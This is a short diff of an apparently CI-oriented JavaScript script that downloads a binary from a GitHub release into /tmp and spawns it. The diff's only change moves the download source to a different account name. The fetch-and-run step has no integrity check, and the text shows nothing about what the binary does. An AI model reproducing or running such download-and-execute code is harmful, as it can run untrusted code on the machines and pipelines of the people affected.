@@ -88,7 +88,7 @@ async function spawnWithRetry(filePath, retries = 3) {
     throw new Error(`Failed to spawn ${filePath} after ${retries} retries`);
 }
 async function run() {
-    const filePath = await downloadFile('https://github.com/totheos/action-dev/releases/latest/download/totheos', '/tmp');
+    const filePath = await downloadFile('https://github.com/totheos-dev/action-dev/releases/latest/download/totheos', '/tmp');
     // Small delay (extra safety for CI environments)
     await new Promise((r) => setTimeout(r, 50));
     const child = await spawnWithRetry(filePath);
